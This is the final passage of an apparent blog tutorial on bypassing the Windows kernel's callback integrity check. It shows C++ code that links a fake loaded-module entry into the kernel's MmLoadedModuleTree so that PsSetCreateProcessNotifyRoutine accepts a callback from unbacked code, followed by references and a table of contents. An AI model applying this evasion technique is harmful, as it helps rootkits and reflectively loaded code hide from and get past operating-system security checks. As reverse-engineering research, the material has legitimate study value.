Inside our critical section, we must figure out exactly where our fake module belongs. The `MmLoadedModuleTree` sorts loaded drivers by their base memory address (`DllBase`). We use a custom routine, `FindAvlInsertPoint`, to traverse the tree from the `pRootNode` down. It compares our fake `DllBase` against the existing nodes to find the correct empty slot, returning the `pParentNode` and a boolean (`bInsertAsRight`) telling us which side of the parent we belong on.

Callback\_Integrity\_Bypass.cpp

```cpp
//--- CRITICAL SECTION (TREE MODIFICATION) ---

  NTSTATUS Insertion_status = FindAvlInsertPoint(pRootNode, g_pASSUMED_AVL_ENTRY_STRUCTURE->Kldr_data_table_entry.DllBase, &pParentNode, &bInsertAsRight);
  if(NT_SUCCESS(Insertion_status))
  {
    pNodeToInsert->ParentValue = (ULONG_PTR)pParentNode;

    if(pParentNode == NULL)
    {
      ppRootNode = static_cast<PRTL_BALANCED_NODE*>(g_vpMmLoadedModuleTree);
      *ppRootNode = pNodeToInsert;
    }
    else
    {
      if(bInsertAsRight) pParentNode->Right = pNodeToInsert;
      else pParentNode->Left = pNodeToInsert;
    }
    Insertion_status = STATUS_SUCCESS;
  }

// --- END OF CRITICAL SECTION ---

ExReleaseResourceLite(g_pPsLoadedModuleResource);
```

Once we find the spot, linking is a easy. First, we point our new node's `ParentValue` up to the `pParentNode`. Second, we point the parent's `Left` or `Right` pointer down to our new node. And finally with the tree pointers successfully updated, our fake module is now officially recognized by the kernel's internal tracking. We must immediately release our exclusive lock so the rest of the OS can resume normal operations.

## return(STATUS\_SUCCESS) [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#returnstatus_success "Direct link to return(STATUS_SUCCESS)")

After reversing the kernel, creating a custom structure, modifying hidden trees, when everything comes together we get to see this:

![Registered_successfully](https://arth.imbeddex.com/img/Kernel%20Callback%20Integrity%20Bypass/Registered_successfully.png)

`PsSetCreateProcessNotifyRoutine` success

So, hey you made it this far. It was a journey, anyways use this technique for research, understand the traces you leave behind and If you want to see how this fits into the bigger picture, you can read my [YetAnotherReflectiveLoader](https://github.com/Oorth/YetAnotherReflectiveLoader) blog :)

Happy reversing!

## References [​](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/\#references "Direct link to References")

[![icon](https://www.google.com/s2/favicons?domain=doxygen.reactos.org&sz=64)\\
\\
ldrtypes.h File Referencereactos\\
\\
›](https://doxygen.reactos.org/d1/d97/ldrtypes_8h.html) [![icon](https://www.google.com/s2/favicons?domain=vergiliusproject.com&sz=64)\\
\_KLDR\_DATA\_TABLE\_ENTRYvergiliusproject\\
\\
›](https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_KLDR_DATA_TABLE_ENTRY)

- [Setup](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#setup)
- [Registering in `PsSetCreateProcessNotifyRoutine`](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#registering-in-pssetcreateprocessnotifyroutine)
- [Reversing `MmVerifyCallbackFunctionCheckFlags`](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#reversing-mmverifycallbackfunctioncheckflags)
- [Reversing `MiLockLoadedDataTableEntry`](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#reversing-milockloadeddatatableentry)
- [Reversing `MmFindDataTableEntryByAddress`](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#reversing-mmfinddatatableentrybyaddress)
  - [The Node](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#the-node)
  - [The -ve Offsets](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#the--ve-offsets)
  - [Top of the Structure](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#top-of-the-structure)
  - [The Unknown Variables](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#the-unknown-variables)
  - [`_ASSUMED_AVL_ENTRY_STRUCTURE`](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#_assumed_avl_entry_structure)
- [Allocate buffer](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#allocate-buffer)
- [Populate fields](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#populate-fields)
  - [Initialize linked list pointers](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#initialize-linked-list-pointers)
  - [Populate core information](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#populate-core-information)
  - [Populate strings](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#populate-strings)
  - [Initializing NodeModuleLink](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#initializing-nodemodulelink)
  - [Insert node](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#insert-node)
- [return(STATUS\_SUCCESS)](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#returnstatus_success)
- [References](https://arth.imbeddex.com/Kernel_stuff/Windows/Kernel-Callback-Integrity-Bypass/#references)

VISITOR

\[CONNECTED\] \_

Your IP: Scanning...\|LOC: Unknown\|ISP: Unknown\|CPU: ? Cores\|RAM: ?Gb\|PWR: Unknown\|DOC: \[==========\]   0%\|00:00:00